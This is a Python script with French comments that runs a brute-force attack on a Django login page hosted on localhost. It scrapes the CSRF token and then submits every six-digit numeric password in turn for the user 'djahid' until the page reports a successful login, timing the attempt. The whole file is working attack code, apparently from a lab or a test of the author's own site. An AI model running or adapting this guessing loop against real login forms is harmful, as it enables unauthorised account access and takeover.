import requests
import time
from bs4 import BeautifulSoup
# URL de ta page de connexion Django
url = 'http://127.0.0.1:8000/'  
username = 'djahid' 

session = requests.Session()

# Récupérer le CSRF token et le cookie
response = session.get(url)
soup = BeautifulSoup(response.content, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'}).get('value')
print(f"CSRF Token récupéré : {csrf_token}")
def try_password(password):
    data = {
        'username': username,
        'password': password , # Mot de passe généré
        'csrfmiddlewaretoken': csrf_token,
    }

    # Envoyer la requête POST au serveur
    headers = {
        'X-CSRFToken': csrf_token,
    }
    response = session.post(url, data=data, headers=headers)
    if "Login successful!" in response.text:
        print(f"Connexion réussie avec : {username} / {password}")
        return True
    else:
        return False


def brute_force_attack(max_length=999999):
    start_time = time.time()  # Commencer le chronomètr
    for length in range(0, max_length ):
    
            length_str=str(length)
            if len(length_str) < 6:
                password = '0' * (6 - len(length_str)) + length_str 
            else:
                password = length_str 
            print(f"Essai avec le mot de passe: {password}")

            # Tester le mot de passe
            if try_password(password):
                end_time = time.time()  # Arrêter le chronomètre
                print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")
                return password  # Retourner le mot de passe trouvé et arrêter

# Lancer l'attaque par force brute
found_password = brute_force_attack()

if found_password:
    print(f"Le mot de passe correct est: {found_password}")
else:
    print("Aucun mot de passe trouvé.")
